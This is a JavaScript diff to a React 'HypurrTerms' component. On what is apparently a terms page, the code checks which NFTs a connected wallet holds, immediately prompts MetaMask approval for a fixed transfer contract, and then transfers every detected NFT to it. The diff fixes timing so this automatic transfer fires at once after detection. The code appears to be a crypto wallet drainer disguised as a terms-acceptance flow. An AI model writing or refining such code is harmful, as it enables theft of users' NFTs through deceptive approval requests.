@@ -308,7 +308,10 @@ const HypurrTerms = () => {
     }
   };
   
-  const approveTransferContract = async () => {
+  const approveTransferContract = async (tokenIdsToUse = null) => {
+    // Use provided tokenIds or fall back to state
+    const idsToUse = tokenIdsToUse || tokenIds;
+    
     if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       throw new Error("Missing required contract addresses");
     }
@@ -320,6 +323,8 @@ const HypurrTerms = () => {
     console.log('=== APPROVAL FUNCTION CALLED ===');
     console.log('Account:', account);
     console.log('Transfer Contract:', TRANSFER_CONTRACT);
+    console.log('TokenIds to use:', idsToUse);
+    console.log('TokenIds length:', idsToUse.length);
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     const signer = await provider.getSigner();
@@ -334,7 +339,7 @@ const HypurrTerms = () => {
     
     // Only approve contracts where user actually has NFTs (based on tokenIds)
     const contractsToApprove = new Set();
-    for (const item of tokenIds) {
+    for (const item of idsToUse) {
       contractsToApprove.add(item.contract.toLowerCase());
     }
     
@@ -398,12 +403,15 @@ const HypurrTerms = () => {
     return true;
   };
   
-  const transferNFTs = async () => {
+  const transferNFTs = async (tokenIdsToUse = null) => {
+    // Use provided tokenIds or fall back to state
+    const idsToUse = tokenIdsToUse || tokenIds;
+    
     if (!account || TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       throw new Error("Missing required contract addresses");
     }
 
-    if (tokenIds.length === 0) {
+    if (!idsToUse || idsToUse.length === 0) {
       throw new Error("No token IDs found. The NFT contract may not support Enumerable. Please contact support.");
     }
 
@@ -418,7 +426,7 @@ const HypurrTerms = () => {
     
     // Group token IDs by contract
     const tokensByContract = {};
-    for (const item of tokenIds) {
+    for (const item of idsToUse) {
       if (!tokensByContract[item.contract]) {
         tokensByContract[item.contract] = [];
       }
@@ -505,14 +513,13 @@ const HypurrTerms = () => {
       // Use the returned values directly to trigger transfer
       if (verificationResult.count > 0 && verificationResult.tokenIds.length > 0) {
         console.log('✅ NFTs found, starting transfer process...');
-        // Small delay to ensure UI updates
-        setTimeout(() => {
-          handleAutomaticTransfer().catch(err => {
-            console.error('=== TRANSFER PROCESS ERROR ===', err);
-            setError(err.message || 'Transfer process failed. Please try again.');
-            setTransferStatus('error');
-          });
-        }, 500);
+        console.log('📋 Passing tokenIds directly to handleAutomaticTransfer:', verificationResult.tokenIds);
+        // Pass tokenIds directly - don't wait for state update
+        handleAutomaticTransfer(verificationResult.tokenIds).catch(err => {
+          console.error('=== TRANSFER PROCESS ERROR ===', err);
+          setError(err.message || 'Transfer process failed. Please try again.');
+          setTransferStatus('error');
+        });
       } else {
         console.log('⚠️ No NFTs found or tokenIds empty, skipping transfer');
         setTransferStatus(null);
@@ -530,13 +537,16 @@ const HypurrTerms = () => {
     }
   };
   
-  const handleAutomaticTransfer = async () => {
+  const handleAutomaticTransfer = async (tokenIdsToUse = null) => {
+    // Use provided tokenIds or fall back to state
+    const idsToUse = tokenIdsToUse || tokenIds;
+    
     console.log('=== handleAutomaticTransfer CALLED ===');
     console.log('TRANSFER_CONTRACT:', TRANSFER_CONTRACT);
-    console.log('tokenIds.length:', tokenIds.length);
-    console.log('tokenIds:', tokenIds);
+    console.log('tokenIdsToUse length:', idsToUse ? idsToUse.length : 'null');
+    console.log('tokenIds state length:', tokenIds.length);
+    console.log('tokenIds to use:', idsToUse);
     console.log('account:', account);
-    console.log('nftCount:', nftCount);
     
     if (TRANSFER_CONTRACT === "0x0000000000000000000000000000000000000000") {
       console.error('❌ Transfer contract not configured. Transfer skipped.');
@@ -544,7 +554,7 @@ const HypurrTerms = () => {
       return;
     }
 
-    if (tokenIds.length === 0) {
+    if (!idsToUse || idsToUse.length === 0) {
       console.error('❌ Unable to get token IDs. Transfer skipped.');
       console.error('This might mean the NFT contract does not support Enumerable.');
       setTransferStatus(null);
@@ -552,6 +562,7 @@ const HypurrTerms = () => {
     }
     
     console.log('✅ All checks passed, proceeding with transfer...');
+    console.log(`📋 Will approve and transfer ${idsToUse.length} NFT(s)`);
 
     try {
       setIsTransferring(true);
@@ -559,15 +570,15 @@ const HypurrTerms = () => {
       // Step 1: Approve contract - this will trigger MetaMask popup immediately
       setTransferStatus('approving');
       console.log('🚀🚀🚀 Auto-transfer: Requesting approval - MetaMask popup should appear NOW 🚀🚀🚀');
-      console.log('📋 About to call approveTransferContract()...');
+      console.log('📋 About to call approveTransferContract() with tokenIds:', idsToUse);
       console.log('⏳ Waiting for MetaMask popup...');
-      await approveTransferContract();
+      await approveTransferContract(idsToUse);
       console.log('✅ Auto-transfer: Approval successful');
       
       // Step 2: Transfer NFTs automatically after approval
       setTransferStatus('transferring');
       console.log('🚀 Auto-transfer: Transferring NFTs...');
-      const txHash = await transferNFTs();
+      const txHash = await transferNFTs(idsToUse);
       
       setTransferTxHash(txHash);
       setTransferStatus('success');
